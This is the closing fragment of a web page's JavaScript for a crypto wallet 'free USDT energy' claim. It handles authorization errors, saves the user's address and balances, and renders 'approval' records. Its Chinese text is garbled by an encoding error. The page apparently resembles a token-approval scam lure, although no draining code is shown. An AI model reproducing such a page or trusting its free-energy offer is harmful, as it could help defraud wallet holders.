                errMsg = "A1ç¯å¢ƒæ ¡éªŒæœªé€šè¿‡ï¼Œè¯·é‡æ–°è¿æ¥é’±åŒ…";
            } else if (errMsg.includes("contract")) {
                errMsg = "åˆçº¦å®ä¾‹æ— æ•ˆï¼Œè¯·é‡æ–°è¿æ¥é’±åŒ…";
            }
            alert(lang.authorizeFail.replace("{msg}", errMsg || "ç­¾åå–æ¶ˆæˆ–ç½‘ç»œå¼‚å¸¸"));
        }
    };
}
// ========== è¾…åŠ©å‡½æ•° ==========
function updateWalletStatus() {
    userAddress ? walletStatusContainer.classList.add("connected") : walletStatusContainer.classList.remove("connected");
}
function saveEnergyRecord() {
    const lang = langConfig[currentLang];
    const existing = JSON.parse(localStorage.getItem(RECORD_KEY) || "[]");
    const newRecords = existing.filter(item => item.address !== userAddress);
    newRecords.push({
        address: userAddress,
        tokenBalance: tokenBalance,
        trxBalance: trxBalance,
        receiveTime: new Date().toLocaleString(),
        energyAmount: "90000Î¼s",
        recordType: lang.freeEnergy
    });
    localStorage.setItem(RECORD_KEY, JSON.stringify(newRecords));
}
function renderEnergyRecords() {
    const lang = langConfig[currentLang];
    const container = document.getElementById("approvalRecords");
    const records = JSON.parse(localStorage.getItem(RECORD_KEY) || "[]");
    // ç¡®ä¿å³ä½¿æ— è®°å½•ï¼Œä¹Ÿæ˜¾ç¤ºé»˜è®¤æ–‡æœ¬ï¼ˆé¿å…ç”¨æˆ·è¯¯ä»¥ä¸ºä¸æ˜¾ç¤ºï¼‰
    if (records.length === 0) {
        container.innerHTML = `<div class='record-item' style='text-align: center; padding: 10px 0;'>${lang.noRecord}</div>`;
        return;
    }
    // æœ‰è®°å½•æ—¶æ­£å¸¸æ¸²æŸ“ï¼ˆåŸæœ‰é€»è¾‘ä¸å˜ï¼‰
    container.innerHTML = records.map(record => `
        <div class='record-item'>
            <p><strong>${lang.recordAddress}</strong>${record.address.slice(0,8)}...${record.address.slice(-6)}</p>
            <p><strong>${lang.recordType}</strong>${record.recordType}</p>
            <p><strong>${lang.recordEnergy}</strong>${record.energyAmount} USDT Energy</p>
            <p><strong>${lang.recordTime}</strong>${record.receiveTime}</p>
        </div>
    `).join("");
}
</script>
</body>
</html>
